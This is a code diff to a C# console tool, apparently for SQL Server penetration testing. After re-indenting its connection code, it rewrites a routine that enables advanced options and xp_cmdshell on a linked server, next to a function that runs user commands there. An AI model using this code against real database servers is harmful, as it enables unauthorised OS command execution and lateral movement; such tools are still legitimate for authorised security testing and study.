@@ -9,32 +9,32 @@ namespace SQL
         static void Main(string[] args)
         {
             // Ask the user for SQL Server name, Database name, Username, and Password
-Console.Write("Enter SQL Server name: ");
-string sqlServer = Console.ReadLine();
+            Console.Write("Enter SQL Server name: ");
+            string sqlServer = Console.ReadLine();
 
-Console.Write("Enter Database name: ");
-string database = Console.ReadLine();
+            Console.Write("Enter Database name: ");
+            string database = Console.ReadLine();
 
-// Ask for username and password, but allow them to be left blank for integrated security
-Console.Write("Enter Username (Leave blank for Windows authentication): ");
-string username = Console.ReadLine();
+            // Ask for username and password, but allow them to be left blank for integrated security
+            Console.Write("Enter Username (Leave blank for Windows authentication): ");
+            string username = Console.ReadLine();
 
-Console.Write("Enter Password (Leave blank for Windows authentication): ");
-string password = Console.ReadLine();
+            Console.Write("Enter Password (Leave blank for Windows authentication): ");
+            string password = Console.ReadLine();
 
-// Construct the connection string dynamically
-string conString;
+            // Construct the connection string dynamically
+            string conString;
 
-// If username and password are provided, use SQL Server authentication
-if (!string.IsNullOrEmpty(username) && !string.IsNullOrEmpty(password))
-{
-    conString = $"Server={sqlServer}; Database={database}; User Id={username}; Password={password}; MultipleActiveResultSets=true;";
-}
-else
-{
-    // If username and password are not provided, use Windows authentication (integrated security)
-    conString = $"Server={sqlServer}; Database={database}; Integrated Security=True; MultipleActiveResultSets=true;";
-}
+            // If username and password are provided, use SQL Server authentication
+            if (!string.IsNullOrEmpty(username) && !string.IsNullOrEmpty(password))
+            {
+                conString = $"Server={sqlServer}; Database={database}; User Id={username}; Password={password}; MultipleActiveResultSets=true;";
+            }
+            else
+            {
+                // If username and password are not provided, use Windows authentication (integrated security)
+                conString = $"Server={sqlServer}; Database={database}; Integrated Security=True; MultipleActiveResultSets=true;";
+            }
 
             // Create a new SqlConnection object with the constructed connection string
             SqlConnection con = new SqlConnection(conString);
@@ -293,17 +293,24 @@ else
         {
             try
             {
-                string enableCmd = $"EXEC ('sp_configure ''show advanced options'', 1; RECONFIGURE; sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT [{linkedServer}];";
-                SqlCommand command = new SqlCommand(enableCmd, con);
-                command.ExecuteNonQuery();
-                Console.WriteLine("Enabled xp_cmdshell on the linked server.");
+                String enableadvoptions = $"EXEC ('sp_configure ''show advanced options'', 1; reconfigure;') AT [{linkedServer}]";
+                String enablexpcmdshell = $"EXEC ('sp_configure ''xp_cmdshell'', 1; reconfigure;') AT [{linkedServer}]";
+                SqlCommand command = new SqlCommand(enableadvoptions, con);
+                SqlDataReader reader = command.ExecuteReader();
+                reader.Close();
+                command = new SqlCommand(enablexpcmdshell, con);
+                reader = command.ExecuteReader();
+                reader.Close();
+                Console.WriteLine($"Successfully enabled xp_cmdshell on {linkedServer}");
             }
             catch (Exception ex)
             {
                 Console.WriteLine("Error enabling xp_cmdshell on linked server: " + ex.Message);
             }
         }
-    
+
+
+
 
         static void ExecuteCommandOnLinkedServer(SqlConnection con, string linkedServer, string userCommand)
         {
